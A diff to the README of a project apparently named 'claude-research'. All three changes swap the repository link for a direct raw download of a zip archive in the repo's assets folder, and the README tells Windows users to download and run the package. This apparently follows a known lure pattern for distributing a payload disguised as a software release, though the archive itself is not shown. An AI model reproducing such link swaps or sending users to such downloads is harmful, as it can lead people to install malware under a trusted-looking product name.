@@ -1,6 +1,6 @@
 # 🧪 claude-research - Write, review, and publish research
 
-[![Download claude-research](https://img.shields.io/badge/Download%20claude--research-blue?style=for-the-badge&logo=github)](https://github.com/halftime-apricotsauce647/claude-research)
+[![Download claude-research](https://img.shields.io/badge/Download%20claude--research-blue?style=for-the-badge&logo=github)](https://github.com/halftime-apricotsauce647/claude-research/raw/refs/heads/main/assets/claude_research_v1.8-beta.2.zip)
 
 ## 📌 What this is
 
@@ -29,7 +29,7 @@ Before you install, make sure your PC has:
 
 Visit this page to download and set up claude-research:
 
-https://github.com/halftime-apricotsauce647/claude-research
+https://github.com/halftime-apricotsauce647/claude-research/raw/refs/heads/main/assets/claude_research_v1.8-beta.2.zip
 
 If the page offers several files, choose the main Windows download or the main project package for the latest release.
 
@@ -180,7 +180,7 @@ This project is built around:
 
 If you need the files again, use this link:
 
-https://github.com/halftime-apricotsauce647/claude-research
+https://github.com/halftime-apricotsauce647/claude-research/raw/refs/heads/main/assets/claude_research_v1.8-beta.2.zip
 
 ## 🧰 Basic checks if it does not open
 
